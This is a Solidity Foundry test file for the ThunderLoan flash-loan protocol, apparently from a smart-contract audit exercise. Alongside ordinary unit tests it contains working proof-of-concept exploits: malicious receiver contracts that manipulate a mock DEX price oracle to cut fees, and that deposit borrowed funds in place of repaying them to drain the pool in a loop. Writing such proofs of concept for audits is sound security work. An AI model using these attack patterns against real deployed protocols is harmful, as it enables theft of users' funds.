// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";

import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";



contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address atacker = address(124);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

   
        _;
    }

     modifier hasDeposits2() {
    
        vm.startPrank(atacker);
        tokenA.mint(atacker, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

        
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }
    

  function testRedeemAfterLoan() public  setAllowedToken hasDeposits {
        // The start is already in setAllowedToken by owner and in hasDeposit by provider
        uint256 amountBeforeRedeem = tokenA.balanceOf(liquidityProvider);

        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        
        vm.startPrank(user);
        
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.startPrank(liquidityProvider);

        thunderLoan.redeem(tokenA, type(uint256).max);

  }


   function test_stealFromPool() public setAllowedToken hasDeposits  {
        
        vm.startPrank(atacker);
        tokenA.mint(atacker, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        
        uint256 amountBeforeRedeem = tokenA.balanceOf(atacker);

        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        
        vm.startPrank(user);
        
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        
        vm.startPrank(atacker);
        thunderLoan.redeem(tokenA, type(uint256).max);
  }


    /* We don't check the amount of fee*/
    function test_RedeemAfterLoan1() public  setAllowedToken hasDeposits {
        // The start is already in setAllowedToken by owner and in hasDeposit by provider
        uint256 amountBeforeRedeem = tokenA.balanceOf(liquidityProvider);

        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        
        vm.startPrank(user);
        
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");

        //uint256 amountFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        //El LProvider retira de la pool el ingreso mas el fee
        vm.startPrank(liquidityProvider);

        thunderLoan.redeem(tokenA, amountBeforeRedeem + calculatedFee);
        uint256 amountAftertRedeem = tokenA.balanceOf(liquidityProvider); // we have de fee

        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
        
        // We need to check if the q is the same as before lending plus the FLoan + fee
        // amountOriginal + (loan+fee) 

        assert(amountBeforeRedeem < amountAftertRedeem);

    }
    // ORACLE MANIPULATION

    function test_oraclemanipulation() public setAllowedToken hasDeposits {
        //1. Setup contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan),"");
        BuffMockPoolFactory poolFactory = new BuffMockPoolFactory(address(weth));
        
        //Creating A TSwap DEX between WETH/tokenA
        address tswapPool = poolFactory.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(poolFactory));

        // 2. Fund TSWAP
        // The LProvider is going to put some tokens into the pool.
        // 100 WETH and 100 TokenA
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();
        // RATIO 1:1


        // 3. Fund ThunderLoan
        vm.prank(thunderLoan.owner());
       
        thunderLoan.setAllowedToken(tokenA, true);
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);

        vm.stopPrank();
        // Now we have:
        // - TSWAP: 100 TokenA and 100 WETH
        // - ThunderLoan: 1000 TokenA
        // Take a flash loan of 50 TokenA
        // Swap it on the dex, taking the price > 150 TokenA - ?? WETH
        // Take out ANOTHER flash loan of 50 tokenA -> cheaper 

        // 4. Make 2 FlashLoan
            //a. Change the price in the pool Weth/TokenA
            //b. To show that doing so greatly reduces the fees we pay on ThunderLoan 
        
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Normal fee cost: ",normalFeeCost);
        // 0.296147410319118389
        uint256 amountToBorrow = 50e18; // twice
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
            address(tswapPool), 
            address(thunderLoan), 
            address(thunderLoan.getAssetFromToken(tokenA)));

        //thunderLoan.flashloan(tswapPool, tokenA, 50, "");
        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr),tokenA, amountToBorrow,"" );
        // This line is gonna call the ThunderLoan::flashloan where 
        // the internal  call "executeOperation" its gonna go to   
         //MaliciousOracleManipulation contract

        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console.log("Attack fee:" , attackFee);
        assert(attackFee < normalFeeCost);
    }
    
    function test_depositFlashLoan()public setAllowedToken hasDeposits() {
        uint256 amountToBorrow = 50e18;
        vm.startPrank(user);
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        MaliciousFlashLoanReceiverDeposit flrd = new MaliciousFlashLoanReceiverDeposit(address(thunderLoan));
        tokenA.mint(address(flrd), fee);
        thunderLoan.flashloan(address(flrd), tokenA, amountToBorrow, "");
        flrd.redeemMoney();
        vm.stopPrank();
        assert(tokenA.balanceOf(address(flrd)) > 50e18+fee);
    }


    function test_depositAndDrain()public setAllowedToken hasDeposits() {
        AssetToken tokenAmount = thunderLoan.getAssetFromToken(tokenA);
        uint256 cantidad = tokenA.balanceOf(address(tokenAmount));

        uint256 amountToBorrow = cantidad/10;
        vm.startPrank(user);
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        MaliciousFlashLoanReceiverDeposit flrd = new MaliciousFlashLoanReceiverDeposit(address(thunderLoan));
        tokenA.mint(address(flrd), fee);
    
        console.log("Total en token",cantidad);
        
        for (int i = 0; i < 10; i++) {
            if(amountToBorrow > tokenA.balanceOf(address(tokenAmount))) break;

            thunderLoan.flashloan(address(flrd), tokenA, amountToBorrow, "");
            flrd.redeemMoney();
            console.log("Steal -> ", tokenA.balanceOf(address(flrd)));

        }

        vm.stopPrank(); 
        uint256 cantidad2= tokenA.balanceOf(address(tokenAmount));

        console.log("Total en token",cantidad2);

        assert(tokenA.balanceOf(address(flrd)) > 50e18+fee);
    }

    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = upgraded.getFee();
        vm.stopPrank();
        console.log("Fee before: ",feeBeforeUpgrade);
        console.log("Fee after: ", feeAfterUpgrade);
        assert(feeBeforeUpgrade != feeAfterUpgrade);
        
    }
}


contract MaliciousFlashLoanReceiverDeposit is IFlashLoanReceiver{
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;
    constructor(address _thunderLoan){
        thunderLoan = ThunderLoan(_thunderLoan);
    } 
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address ,//initiator
        bytes calldata //params
    )
        external
        returns (bool){
            s_token = IERC20(token);
            assetToken = thunderLoan.getAssetFromToken(IERC20(token));           
            IERC20(token).approve(address(thunderLoan), amount+fee);          
            thunderLoan.deposit(IERC20(token), amount+fee);
            return true;
        }

    function redeemMoney() public{
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}


contract MaliciousFlashLoanReceiver_Negative is IFlashLoanReceiver{
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;
    constructor(address _thunderLoan){
        thunderLoan = ThunderLoan(_thunderLoan);
    } 
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address ,//initiator
        bytes calldata //params
    )
        external
        returns (bool){
            s_token = IERC20(token);
            assetToken = thunderLoan.getAssetFromToken(IERC20(token));           
            IERC20(token).approve(address(thunderLoan), amount+fee);          
            thunderLoan.deposit(IERC20(token), amount+fee);
            return true;
        }

    function redeemMoney() public{
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}



contract MaliciousFlashLoanReceiver is IFlashLoanReceiver{
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool atacked;
    uint256 public feeOne;
    uint256 public feeTwo;
    constructor(address _tswapPool, address _thunderLoan, address _repayAddress){
        thunderLoan =ThunderLoan(_thunderLoan);
        tswapPool = BuffMockTSwap(_tswapPool);
        repayAddress = _repayAddress;
    } 

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address ,//initiator
        bytes calldata //params
    )
        external
        returns (bool){
            if(!atacked){
                // 1. Swap TokenA borrowed for WETH


                // 2. Take out ANOHTER flash loan
                feeOne = fee;

                uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
                //tswapPool.getOutputAmountBasedOnInput(inputTokensOrWeth, inputTokensOrWethReserves, outputTokensOrWethReserves);
                IERC20(token).approve(address(tswapPool), 50e18);
                // Tanks the price
                // From 100 & '100
                // To 150 & 80
                tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
                //tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(poolTokenAmount, minWeth, deadline);
                                                  atacked = true;

                // -  Second flashLoan
                thunderLoan.flashloan(address(this), IERC20(token),amount, "" );

                //IERC20(token).approve(address(thunderLoan), amount+fee);
                //thunderLoan.repay(IERC20(token), amount+fee);
                IERC20(token).transfer(address(repayAddress), amount+fee);


            }else{
                // calculate the fee and repay
                feeTwo = fee; // cheaper fee
                // repay
                //IERC20(token).approve(address(thunderLoan), amount+fee);
                //thunderLoan.repay(IERC20(token), amount+fee);
                uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
                //tswapPool.getOutputAmountBasedOnInput(inputTokensOrWeth, inputTokensOrWethReserves, outputTokensOrWethReserves);
                IERC20(token).transfer(address(repayAddress), amount+fee);

            }
            return true;
        }
}